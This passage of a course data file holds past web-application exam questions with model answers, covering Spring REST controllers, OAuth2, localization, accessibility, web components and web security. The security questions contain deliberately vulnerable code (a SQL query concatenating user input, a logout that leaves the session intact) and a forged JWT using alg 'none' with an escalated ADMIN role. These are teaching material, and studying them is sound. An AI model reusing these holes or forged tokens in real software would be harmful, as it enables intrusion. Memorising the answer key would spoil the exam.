<p>The result can be: (1) throw InvalidTokenException in line 12, (2) invoke deleteAllUsers() in line 7, (3) log the error in line 9. Discuss the result for I) JWT #1 and II) JWT #2.</p>`, sol: "@jwtParse" }
      ]},
    { title: "Question 5 – JavaScript", weight: 20,
      intro: `<p>A JavaScript module includes the code below (used in a–c):</p>
~~~javascript
const template = document.createElement("template");
template.innerHTML = "<h1>Welcome to DAT152</h1>";

class MessageElement extends HTMLElement {
    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.appendChild(content);
    }
    connectedCallback() { /* Code of connectedCallback() */ }
    disconnectedCallback() { /* Code of disconnectedCallback() */ }
}
customElements.define('message-element', MessageElement);
~~~`,
      tasks: [
        { label: "a (2%)", type: "text", q: `<p>What are the consequences of running the <code>customElements.define()</code> method?</p>`, sol: "@define" },
        { label: "b (2%)", type: "code", lang: "javascript", q: `<p>i. When will the method connectedCallback() run?<br>ii. When will the method disconnectedCallback() run? Create a code example that will trigger the browser to run disconnectedCallback() (the code should not call the method itself).</p>`, sol: "@lifecycle" },
        { label: "c (2%)", type: "text", q: `<p>i. Why should we use the cloneNode() method before adding the template content to the component?<br>ii. What would be the consequences for MessageElement if cloneNode() was removed, i.e. <code>const content = template.content;</code></p>`, sol: "@clonenode" },
        { label: "d (2%)", type: "text", q: `<p>An HTML file includes: <code>&lt;script src="components/dice.js" type="module"&gt;&lt;/script&gt;</code></p><p>i. Where in the HTML code would you put the script tag? You must justify the answer.<br>ii. What are the consequences of the attribute type="module"?</p>`, sol: "@scriptModule" },
        { label: "e (2%)", type: "text", q: `<p>JavaScript frameworks and libraries can provide functionality for synchronization of state and view.</p><p>i. In this context, what do we mean with state and view?<br>ii. Provide an example of synchronization of view from state.</p>`, sol: "@stateView" },
        { label: "f (10%)", type: "code", lang: "javascript",
          q: `<p>Write code for a component <b>MessageList</b> (custom tag <code>message-list</code>) in an application for broadcasting messages between employees.</p>
<div class="figure mock"><div style="border:1px solid #ccc;padding:6px;margin:4px 0"><b>Gro</b><br>I am missing a chair in my office</div><div style="border:1px solid #ccc;padding:6px"><b>Ola</b><br>Lunch at 12?</div></div>
<p>MessageList has two public methods:</p>
<ul><li><code>show(message)</code>: displays a message at the <b>top</b> of the message list. In: Object. Return: none.</li>
<li><code>remove(id)</code>: removes the message with message id equal to id. In: Integer. Return: none.</li></ul>
<p>A message object: <code>{ "id": 3, "author": "Gro", "text": "I am missing a chair in my office" }</code>. The id must be stored with the message as the custom data attribute <code>data-id</code>.</p>
<p><b>Task:</b> Fill in the missing code. Use the two templates.</p>`,
          starter: `const listtemplate = document.createElement("template");
listtemplate.innerHTML = '<div id="list"></div>';

const messagetemplate = document.createElement("template");
messagetemplate.innerHTML = \`
    <div class="message">
        <div class="author"></div>
        <div class="text"></div>
    </div>\`;

class MessageList extends HTMLElement {
    #shadow;

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        const content = listtemplate.content.cloneNode(true);
        this.#shadow.appendChild(content);
        // More code, if necessary
    }

    show(message) {
        // Code of method show()
    }

    remove(id) {
        // Code of method remove()
    }

    // More code, if necessary
}
customElements.define('message-list', MessageList);
`,
          sol: `~~~javascript
class MessageList extends HTMLElement {
    #shadow;
    #list;

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        const content = listtemplate.content.cloneNode(true);
        this.#shadow.appendChild(content);
        this.#list = this.#shadow.getElementById("list");
    }

    show(message) {
        const content = messagetemplate.content.cloneNode(true);
        const messageElm = content.firstElementChild;
        messageElm.dataset.id = message.id;
        messageElm.querySelector(".author").textContent = message.author;
        messageElm.querySelector(".text").textContent = message.text;
        this.#list.insertBefore(messageElm, this.#list.firstElementChild);
    }

    remove(id) {
        const messageElm = this.#list.querySelector(\`[data-id="\${id}"]\`);
        if (messageElm !== null) {
            messageElm.remove();
        }
    }
}
customElements.define('message-list', MessageList);
~~~` }
      ]}
  ]
});

DAT.exams.push({
  id: "h24", title: "Høst 2024", kind: "past", appendix: ["spring", "js"], note: "Oppgave 3 (custom tags) er fjernet – ikke pensum i år. Globalization-oppgaven brukte JSP; her lager du bare property-filene.",
  questions: [
    { title: "Question 1 – Web Frameworks and Services", weight: 30,
      intro: `<div class="figure"><b>Student–Course model</b> (many-to-many)<br>Student: <code>PK sid</code>, name … &nbsp;|&nbsp; Course: <code>PK cid</code>, code, name, semester …</div>
<p>A studapp REST service for managing students and courses per semester. Students can create a profile, update their information, register for courses, withdraw from courses, update their courses, or list the courses they have registered for. Staff can list all students registered for a course, create a new course, update course information, or delete courses.</p>`,
      tasks: [
        { label: "a", type: "code", lang: "text", q: `<p>Build REST API endpoints for this service.</p>
<p><b>Student:</b> i. Register/create a profile; ii. View details about own profile; iii. Update profile information; iv. Register for a new course; v. Withdraw from a course; vi. List all registered courses; vii. View details about a registered course.</p>
<p><b>Staff:</b> i. List all courses; ii. List all students registered for a course; iii. Create a new course; iv. Update a course; v. Delete a course; vi. List all students.</p>`,
          starter: "Service | API Method | Endpoint (URI) | HTTP Method\nGet or view details about own profile | getStudentProfile | students/{sid} | GET\n",
          sol: `<table><tr><th>Service</th><th>API Method</th><th>Endpoint</th><th>HTTP</th><th>Role</th></tr>
<tr><td>Create a new profile</td><td>registerProfile</td><td>/students</td><td>POST</td><td>USER</td></tr>
<tr><td>List all students</td><td>getStudentsProfiles</td><td>/students</td><td>GET</td><td>ADMIN</td></tr>
<tr><td>View own profile</td><td>getStudentProfile</td><td>/students/{sid}</td><td>GET</td><td>USER</td></tr>
<tr><td>Update profile</td><td>updateStudentProfile</td><td>/students/{sid}</td><td>PUT</td><td>USER</td></tr>
<tr><td>Register for a new course</td><td>registerForCourse</td><td>/students/{sid}/courses</td><td>POST</td><td>USER</td></tr>
<tr><td>Withdraw from a course</td><td>withdrawFromCourse</td><td>/students/{sid}/courses/{cid}</td><td>DELETE</td><td>USER</td></tr>
<tr><td>List registered courses</td><td>getAllCoursesByStudentId</td><td>/students/{sid}/courses</td><td>GET</td><td>USER</td></tr>
<tr><td>View a registered course</td><td>getACourseByStudentId</td><td>/students/{sid}/courses/{cid}</td><td>GET</td><td>USER</td></tr>
<tr><td>List all courses</td><td>getCourses</td><td>/courses</td><td>GET</td><td>USER</td></tr>
<tr><td>List students in a course</td><td>getAllStudentsRegCourse</td><td>/courses/{cid}/students</td><td>GET</td><td>ADMIN</td></tr>
<tr><td>Create a new course</td><td>createCourse</td><td>/courses</td><td>POST</td><td>ADMIN</td></tr>
<tr><td>Update a course</td><td>updateCourse</td><td>/courses/{cid}</td><td>PUT</td><td>ADMIN</td></tr>
<tr><td>Delete a course</td><td>deleteCourse</td><td>/courses/{cid}</td><td>DELETE</td><td>ADMIN</td></tr></table>` },
        { label: "b I", type: "code", lang: "java", q: `<p>You have the StudentService and CourseService classes:</p>
~~~java
@Service
public class StudentService {
    public Student saveStudentProfile(Student student) {...}
    public List<Student> findAll() {...}
    public Student findById(Long sid) throws StudentNotFoundException {...}
    public Student updateStudentProfile(Student student, Long sid) throws StudentNotFoundException {...}
    public Set<Course> saveCourse(Long sid, Course course) throws StudentNotFoundException {...}
    public Set<Course> findCourses(Long sid) throws StudentNotFoundException {...}
    public Course findCourse(Long sid, Long cid) throws StudentNotFoundException, CourseNotFoundException {...}
    public Set<Course> deleteCourse(Long sid, Long cid) throws StudentNotFoundException, CourseNotFoundException {...}
}
@Service
public class CourseService {
    public Course saveCourse(Course course) {...}
    public Course updateCourse(Course course, Long cid) throws CourseNotFoundException {...}
    public List<Course> findAll() {...}
    public Set<Student> findStudentsByCid(Long cid) throws CourseNotFoundException {...}
    public void deleteById(Long cid) throws CourseNotFoundException {...}
}
~~~
<p>Implement the controller class and the methods for all the <b>Student</b> REST API endpoints from a). Return appropriate HttpStatus codes. You can use StudentNotFoundException and CourseNotFoundException.</p>`,
          starter: `@RestController
@RequestMapping("/studapp/api/v1")
public class StudentController {

}
`,
          sol: `~~~java
@RestController
@RequestMapping("/studapp/api/v1")
public class StudentController {

    @Autowired
    private StudentService studentService;

    @PostMapping("/students")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Student> registerProfile(@RequestBody Student student) {
        Student nstudent = studentService.saveStudentProfile(student);
        return new ResponseEntity<>(nstudent, HttpStatus.CREATED);
    }

    @GetMapping("/students")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> getStudentsProfiles() {
        List<Student> students = studentService.findAll();
        if (students.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(students, HttpStatus.OK);
    }

    @GetMapping("/students/{sid}")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Student> getStudentProfile(@PathVariable("sid") Long sid)
            throws StudentNotFoundException {
        return new ResponseEntity<>(studentService.findById(sid), HttpStatus.OK);
    }

    @PutMapping("/students/{sid}")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Student> updateStudentProfile(@RequestBody Student student,
            @PathVariable("sid") Long sid) throws StudentNotFoundException {
        return new ResponseEntity<>(studentService.updateStudentProfile(student, sid), HttpStatus.OK);
    }

    @PostMapping("/students/{sid}/courses")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> registerForCourse(@PathVariable("sid") Long sid,
            @RequestBody Course course) throws StudentNotFoundException {
        return new ResponseEntity<>(studentService.saveCourse(sid, course), HttpStatus.CREATED);
    }

    @GetMapping("/students/{sid}/courses")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> getAllCoursesByStudentId(@PathVariable("sid") Long sid)
            throws StudentNotFoundException {
        Set<Course> courses = studentService.findCourses(sid);
        if (courses.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(courses, HttpStatus.OK);
    }

    @GetMapping("/students/{sid}/courses/{cid}")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> getACourseByStudentId(@PathVariable("sid") Long sid,
            @PathVariable("cid") Long cid)
            throws StudentNotFoundException, CourseNotFoundException {
        return new ResponseEntity<>(studentService.findCourse(sid, cid), HttpStatus.OK);
    }

    @DeleteMapping("/students/{sid}/courses/{cid}")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> withdrawFromCourse(@PathVariable("sid") Long sid,
            @PathVariable("cid") Long cid)
            throws StudentNotFoundException, CourseNotFoundException {
        return new ResponseEntity<>(studentService.deleteCourse(sid, cid), HttpStatus.OK);
    }
}
~~~` },
        { label: "b II", type: "code", lang: "java", q: `<p>Implement the controller class and methods for the <b>Course</b> REST API endpoints from a).</p>`,
          starter: `@RestController
@RequestMapping("/studapp/api/v1")
public class CourseController {

}
`,
          sol: `~~~java
@RestController
@RequestMapping("/studapp/api/v1")
public class CourseController {

    @Autowired
    private CourseService courseService;

    @GetMapping("/courses")
    @PreAuthorize("hasAuthority('USER')")
    public ResponseEntity<Object> getCourses() {
        List<Course> courses = courseService.findAll();
        if (courses.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(courses, HttpStatus.OK);
    }

    @GetMapping("/courses/{cid}/students")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> getAllStudentsRegCourse(@PathVariable("cid") Long cid)
            throws CourseNotFoundException {
        Set<Student> students = courseService.findStudentsByCid(cid);
        if (students.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(students, HttpStatus.OK);
    }

    @PostMapping("/courses")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Course> createCourse(@RequestBody Course course) {
        Course ncourse = courseService.saveCourse(course);
        return new ResponseEntity<>(ncourse, HttpStatus.CREATED);
    }

    @PutMapping("/courses/{cid}")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Course> updateCourse(@RequestBody Course course,
            @PathVariable("cid") Long cid) throws CourseNotFoundException {
        Course ncourse = courseService.updateCourse(course, cid);
        return new ResponseEntity<>(ncourse, HttpStatus.OK);
    }

    @DeleteMapping("/courses/{cid}")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<String> deleteCourse(@PathVariable("cid") Long cid)
            throws CourseNotFoundException {
        courseService.deleteById(cid);
        try {
            courseService.findStudentsByCid(cid);
            return new ResponseEntity<>("Delete failed!", HttpStatus.NOT_MODIFIED);
        } catch (CourseNotFoundException e) {
            return new ResponseEntity<>("Delete successful!", HttpStatus.OK);
        }
    }
}
~~~` },
        { label: "c I", type: "text", q: `<p>Assume the studapp service uses a 3rd party IdP based on OAuth2. Briefly explain the authorization flow using the OAuth2 "authorization code grant type" between the resource owner and the IdP.</p>`, sol: "@authcodeFlow" },
        { label: "c II", type: "code", lang: "java", q: `<p>Roles ADMIN and USER in the JWT: ADMIN and USER are assigned to staff, only USER to students. Protect the endpoints in StudentController and CourseController with relevant Spring annotations.</p>`, starter: "", sol: `<p>See the solution in b I and b II, where these annotations are used:</p>
~~~java
@PreAuthorize("hasAuthority('ADMIN')")   // staff-only endpoints
@PreAuthorize("hasAuthority('USER')")    // student endpoints (staff also has USER)
~~~` }
      ]},
    { title: "Question 2 – Globalization", weight: 10, tasks: [
        { label: "a", type: "text", q: `<p>In your own words, briefly explain what globalization, internationalization, and localization are.</p>`, sol: "@g11n" },
        { label: "b", type: "code", lang: "properties", q: `<p>Internationalize the page below and localize it to English and one other language. Write the property files.</p>
~~~html
<body>
    <div> If you live in Bergen, you should expect rain between 200 and 240 days out of 365 days.
    This is equivalent to roughly 55% of rain in a year. </div>
</body>
~~~`, starter: "# Message_en.properties\n\n\n# Message_no.properties\n",
          sol: `~~~properties
# Message_en.properties
msg=If you live in Bergen, you should expect rain between {0} and {1} days out of {2} days. This is equivalent to roughly {3} of rain in a year.

# Message_no.properties
msg=Bor du i Bergen bør du regne med regn mellom {0} og {1} dager av {2} dager. Dette tilsvarer omtrent {3} av regn i løpet av et år.
~~~
<p class="small">Tallene (200, 240, 365, 55 %) er parametere som formateres for hvert språk.</p>` }
      ]},
    { title: "Question 4 – Universal Design", weight: 5, tasks: [
        { label: "a", type: "text", q: `<p>What is Universal Design?</p>`, sol: "@ud" },
        { label: "b", type: "text", q: `<p>Give 3 principles of UD.</p>`, sol: "@ud3" },
        { label: "c", type: "text", q: `<p>Briefly discuss the WCAG principle #2 – "Operable" and the guidelines for this principle.</p>`, sol: "@operable" }
      ]},
    { title: "Question 5 – Web security", weight: 25, tasks: [
        { label: "a", type: "text", q: `<p>You have saved a session token as a cookie in a web browser storage. What are the secure ways to protect the cookie from XSS vulnerability and session hijacking attack?</p>`, sol: "@cookieProtect" },
        { label: "b", type: "code", lang: "java", q: `<p>A logout controller of a web application contains the code below.</p>
~~~java
@WebServlet("/logout")
public class LogoutServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        request.getSession().removeAttribute("user");
        request.getRequestDispatcher("index.jsp").forward(request, response);
    }
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        doGet(request, response);
    }
}
~~~
<p>I) What major session vulnerability is present in this implementation?<br>II) Write a mitigation for this vulnerability.</p>`, sol: "@logoutVuln" },
        { label: "c", type: "code", lang: "java", q: `<p>Given the 2 SQL queries below:</p>
~~~java
// Implementation 1
public AppUser getAuthUser(String username, String password) {
    PreparedStatement stmt = conn.prepareStatement("SELECT * FROM SecOblig.AppUser
        WHERE USERNAME = " + username + " and PASSWORD = " + password);
    stmt.executeUpdate();
}
// Implementation 2
public List<String> getUsernames() {
    Statement stmt = conn.createStatement();
    stmt.executeQuery("SELECT username FROM SecOblig.AppUser");
}
~~~
<p>I) Which of the two implementations can be vulnerable to SQL injection?<br>II) Write the mitigation code for the implementation that you identified as vulnerable.</p>`,
          sol: `<p>Only <b>implementation 1</b> is vulnerable. It uses a PreparedStatement insecurely, since untrusted data is added to the query before preparing it. Implementation 2 is not vulnerable because there is no untrusted data in the query.</p>
~~~java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM SecOblig.AppUser WHERE USERNAME = ? and PASSWORD = ?");
stmt.setString(1, username);
stmt.setString(2, password);
stmt.executeQuery();
~~~` },
        { label: "d", type: "text", q: `<p>Passwords can be stored securely by using 1) cryptographically secure hash, 2) slow hash algorithm, 3) unique per user salt, and 4) pepper. Explain the security benefits of using these four password storage features.</p>`, sol: "@pw4" },
        { label: "e", type: "text", q: `<p>jjwt from Oblig4 has two methods: <code>parse(token)</code> and <code>parseClaimsJws(token)</code>. The JWT has been modified:</p>
<p><b>JWT #1</b> – header <code>{"alg": "none"}</code>, payload <code>{"iat": 1730803010, "role": "ADMIN", "user": "Bob"}</code>, signature removed.<br>
<b>JWT #2</b> – header <code>{"alg": "RS256"}</code>, same modified payload, with an old signature.</p>
~~~java
1.  try {
2.      Jwt jwt = Jwts.parser().setSigningKey(KEY).parseClaimsJws(accessToken);
3.      Claims claims = (Claims) jwt.getBody();
4.      String user = (String) claims.get("user");
5.      String role = (String) claims.get("role");
6.      if (role.equals("ADMIN")) {
7.          deleteAllUsers();
8.      } else {
9.          log.error("You are not an admin user");
10.     }
11. } catch (JwtException e) {
12.     throw new InvalidTokenException(e);
13. }
~~~
<p>Results can be: (1) InvalidTokenException in line 12, (2) deleteAllUsers() in line 7, (3) log error in line 9. Discuss the results for JWT #1 and JWT #2.</p>`, sol: "@jwtParseClaims" },
        { label: "f", type: "text", q: `<p>There is a trust relationship between the Authorization Server and the Resource Server. Describe briefly how this 'trust' relationship is established.</p>`, sol: "@trust" },
        { label: "g", type: "text", q: `<p>A client can access a protected resource by sending a request with a JWT to the Resource Server. Describe the security actions that the Authorization Server must take before sending the JWT in a response to the client.</p>`, sol: "@asActions" }
      ]},
    { title: "Question 6 – JavaScript", weight: 20, tasks: [
        { label: "a i", type: "text", q: `<p>A shadow DOM can be created by: <code>const shadow = this.attachShadow({ mode: 'closed' });</code></p><p>What is a shadow DOM? Your answer must outline the differences between a "normal" DOM and a shadow DOM.</p>`, sol: "@shadowDom" },
        { label: "a ii", type: "code", lang: "javascript", q: `<p>1. What are the consequences if mode is set to open?<br>2. Show with a code example how to utilize that mode is set to open for a shadow DOM component.</p>`,
          sol: `<p>If mode is open, the elements of the shadow DOM can be accessed with JavaScript from outside, using the <code>shadowRoot</code> property. Example (deletes the table in a &lt;shopping-list&gt; component):</p>
~~~javascript
const element = document.querySelector("shopping-list");
const tableElement = element.shadowRoot.querySelector("table");
tableElement.remove();
~~~` },
        { label: "a iii", type: "code", lang: "html", q: `<p>1. What is the purpose of the HTML tag &lt;SLOT&gt;?<br>2. Demonstrate with code examples how to use the &lt;SLOT&gt; tag.</p>`, sol: "@slot" },
        { label: "a iv", type: "code", lang: "javascript", q: `<p>A component with shadow DOM (closed) should produce the view <code>&lt;P&gt;Course is &lt;SPAN&gt;DAT152&lt;/SPAN&gt;&lt;/P&gt;</code>. The course code is decided by the parent component. Discuss different approaches for the parent component to set the course code.</p>`, sol: "@parentChild" },
        { label: "a v", type: "text", q: `<p>The code <code>const result = await storagemanager.remove(id);</code> is found in a web application. What kind of object must be returned by <code>storagemanager.remove(id)</code>? Describe this kind of object.</p>`, sol: "@promiseObj" },
        { label: "b", type: "code", lang: "javascript",
          q: `<p>Write the code of a GUI component <b>ShoppingList</b> that displays a shopping list.</p>
<div class="figure mock"><table style="width:auto"><tr><th>Item</th><th>Amount</th><th>Deadline</th><th></th></tr><tr><td>Bananas</td><td>2 kg</td><td>Saturday in the afternoon</td><td><button type="button" disabled>Remove</button></td></tr></table></div>
<p>An item: <code>{ "id": 1, "name": "Bananas", "amount": "2 kg", "deadline": new Date(2024,10,30,12,23) }</code>. The deadline text is produced by:</p>
~~~javascript
const deadlineText = item.deadline.toLocaleDateString(
    navigator.language, { weekday: "long", dayPeriod: "long" });
~~~
<p>Public methods:</p>
<ul><li><code>additem(item)</code>: adds an item and updates the view. The list must be <b>sorted on deadline</b>, shortest deadline at the top.</li>
<li><code>removeitem(id)</code>: removes the item with the given id from the view.</li>
<li><code>addremoveitemcallback(callback)</code>: adds a callback that is run when the user clicks a Remove button, with the id of the item as argument. Does not update the view (the item should only be removed with removeitem if it was removed on the server).</li></ul>
<p><b>Task:</b> Fill in the missing code.</p>`,
          starter: `const template = document.createElement("template");
template.innerHTML = \`
    <table id="shoppinglist">
        <thead>
            <tr><th>Item</th><th>Amount</th><th>Deadline</th></tr>
        </thead>
        <tbody></tbody>
    </table>\`;

const itemrow = document.createElement("template");
itemrow.innerHTML = \`
    <tr>
        <td></td>
        <td></td>
        <td></td>
        <td><button type="button">Remove</button></td>
    </tr>\`;

class ShoppingList extends HTMLElement {
    // Add the necessary private fields

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        // More code, if necessary
    }

    addremoveitemcallback(callback) {
        // More code
    }

    additem(item) {
        // More code
    }

    removeitem(id) {
        // More code
    }
}
customElements.define('shopping-list', ShoppingList);
`,
          sol: `~~~javascript
class ShoppingList extends HTMLElement {
    #callbacks = new Map();
    #shoppinglist;

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        this.#shoppinglist = shadow.getElementById("shoppinglist").tBodies[0];
    }

    addremoveitemcallback(callback) {
        const callbackid = Symbol("removeitemcallback");
        this.#callbacks.set(callbackid, callback);
        return callbackid;
    }

    additem(item) {
        let row = this.#shoppinglist.querySelector(\`tr[data-id="\${item.id}"]\`);
        if (row !== null) return;                 // already listed

        const content = itemrow.content.cloneNode(true);
        row = content.firstElementChild;
        row.dataset.id = item.id;
        row.dataset.time = item.deadline.getTime();
        row.cells[0].textContent = item.name;
        row.cells[1].textContent = item.amount;
        row.cells[2].textContent = item.deadline.toLocaleDateString(
            navigator.language, { weekday: "long", dayPeriod: "long" });
        const bt = row.cells[3].getElementsByTagName("button")[0];
        bt.addEventListener("click", () => { this.#onremove(item.id) });

        // insert before the first row with a later deadline
        const index = Array.from(this.#shoppinglist.rows)
            .findIndex(element => element.dataset.time > row.dataset.time);
        const newrow = this.#shoppinglist.insertRow(index);
        newrow.replaceWith(row);
    }

    removeitem(id) {
        const row = this.#shoppinglist.querySelector(\`tr[data-id="\${id}"]\`);
        if (row !== null) row.remove();
    }

    #onremove(id) {
        this.#callbacks.forEach(callback => callback(id));
    }
}
customElements.define('shopping-list', ShoppingList);
~~~` }
      ]}
  ]
});
